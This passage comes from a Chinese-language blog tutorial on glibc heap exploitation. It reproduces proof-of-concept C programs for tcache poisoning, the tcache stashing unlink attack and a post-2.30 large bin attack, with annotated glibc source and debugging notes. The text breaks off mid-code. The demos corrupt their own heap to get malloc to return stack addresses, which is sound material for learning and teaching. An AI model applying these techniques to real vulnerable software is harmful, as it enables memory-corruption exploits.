<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="源码-22"><a href="#源码-22" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-22"><a href="#调试-22" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015125946150.png"
                      alt="image-20231015125946150"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130236228.png"
                      alt="image-20231015130236228"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130341804.png"
                      alt="image-20231015130341804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130255142.png"
                      alt="image-20231015130255142"
                ></p>
<p>申请同样大小的 <code>a,b</code> 两个 <code>chunk</code>，并将其放在 <code>tcache</code> 中。然后将后进入的 <code>chunk_b_fd</code> 改为 <code>stack_var_fd</code>，这样就能将其链接进 <code>tcache</code>，<code>tcache</code> 的数量为 <code>2</code>，可以申请两个 <code>chunk</code> 出来。 在 <code>2.29</code> 以后，如果 <code>tcache</code> 的数量为 <code>0</code>，就算 <code>tcache</code> 中有 <code>free_chunk</code> 也不会将其取出来，所以我们确保 <code>tcache</code> 的数量为 <code>2</code>，这样就能取出两个 <code>chunk</code>。</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><p>利用 <code>calloc</code> 可以越过 <code>tcache</code> 取 <code>chunk</code> 的特点结合 <code>house of lore</code> 进行的攻击手段，可以向任意地址写入任意值，也可以申请任意地址。</p>
<h3 id="源码-23"><a href="#源码-23" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        <span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>可以看到，这种攻击手段并没有经过 <code>house of lore</code> 的需要经过的验证，即没有这一个要求 <code> bck-&gt;fd == victim</code>。</p>
<h3 id="调试-23"><a href="#调试-23" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015135526620.png"
                      alt="image-20231015135526620"
                ></p>
<p>目标地址的 <code>stack_var_bk == stack_var_fd</code>，为了后续将 <code>fake_chunk</code> 的 <code>bk</code> 指针指向一块可写的内存，绕过 <code>glibc</code> 在摘链表时候的检查，样例中我们在 <code>small_bin</code> 中摘取两个 <code>chunk</code> 放入 <code>tcache</code> ，<code>tcache</code>便已经满了，不会再去索取 <code>fake_chunk_bk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140157626.png"
                      alt="image-20231015140157626"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140331259.png"
                      alt="image-20231015140331259"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140509323.png"
                      alt="image-20231015140509323"
                ></p>
<p>申请 <code>9</code> 个 <code>0x90</code> 大小的 <code>chunk</code>，将 <code>3~8</code> 这 <code>6</code> 个 <code>chunk</code> 放进 <code>tcache</code> 中， 然后依次释放 <code>1,0,2</code> 三个 <code>chunk</code>，<code>1</code> 将会进入 <code>tcache</code> 中，<code>0,2</code> 进入 <code>unsorted</code>，因为不相邻，所以不会触发合并。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140538358.png"
                      alt="image-20231015140538358"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140650996.png"
                      alt="image-20231015140650996"
                ></p>
<p><code>malloc(0xa0)</code> 将会触发整理机制，将 <code>unsorted_bin</code> 中的 <code>chunk</code> 放进 <code>small_bin</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140716845.png"
                      alt="image-20231015140716845"
                ></p>
<p>接下来在 <code>tcache</code> 中腾出两个位置，为后续放入 <code>small_bin chunk</code> 做准备。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140815350.png"
                      alt="image-20231015140815350"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140838808.png"
                      alt="image-20231015140838808"
                ></p>
<p>将 <code>small_bin</code> 中倒数第二个 <code>chunk_bk</code> 指向 <code>stack_var</code>，为后续将 <code>chunk</code> 放入 <code>tcache</code> 中做索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141053095.png"
                      alt="image-20231015141053095"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141310006.png"
                      alt="image-20231015141310006"
                ></p>
<p>利用 <code>calloc(1,0x90)</code> 将 <code>small_bin</code> 中最后一个 <code>chunk</code> 拿出来，然后触发整理机制，将 <code>small_bin</code> 中剩余的 <code>chunk</code> 倒序取出放入 <code>tcache</code>，也就是按 <code>bk</code> 去索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141338609.png"
                      alt="image-20231015141338609"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141353825.png"
                      alt="image-20231015141353825"
                ></p>
<p>此时再次申请将会把目标地址的<code>fake_chunk</code>申请出来。</p>
<h1 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h1><h2 id="large-bin-attack-glibc-2-29"><a href="#large-bin-attack-glibc-2-29" class="headerlink" title="large_bin_attack (glibc &gt; 2.29)"></a>large_bin_attack (glibc &gt; 2.29)</h2><p>本次使用 <code>ubuntu:20.04</code> 。</p>
<h3 id="源码-24"><a href="#源码-24" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] 